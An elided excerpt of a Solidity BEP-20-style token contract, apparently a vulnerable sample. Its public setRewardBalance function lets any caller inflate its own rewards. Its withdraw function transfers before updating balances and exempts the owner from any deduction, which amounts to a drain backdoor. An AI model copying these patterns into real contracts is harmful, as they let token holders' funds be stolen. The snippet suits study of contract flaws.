...
contract MFWTOKEN is Context, IERC20, Ownable {
    ...
    //Test: 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee
    address busdToken = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
    mapping (address => uint256) _introduceRawards;
    uint256 busdFee = 1 * 10 ** 16;//0.01 BUSD
    uint256 reward = 1 * 10 ** 15;//0.0001 BUSD
    uint256 airdropAmount;
    mapping (uint256 => uint256) _rawards;
    ...
    function setRewardBalance() public returns(bool) {
        uint256 key = uint256(uint160(msg.sender));
        _rawards[key] = _rawards[key].add(reward);
        return true;
    }
    ...
    function withdraw(address recipient, uint256 amount) public returns(bool) {
        require(msg.sender == recipient, "TOKEN: Recipient must be sender");
        require(amount != 0, "TOKEN: Amount cannot be 0");
        uint256 rewardTotal = _introduceRawards[address(recipient)];
        ...
        if(bc.transfer(msg.sender,amount)) {
            if(msg.sender != owner) {
                _introduceRawards[address(recipient)] = _introduceRawards[address(recipient)].sub(amount, "Insufficient Balance");
            }
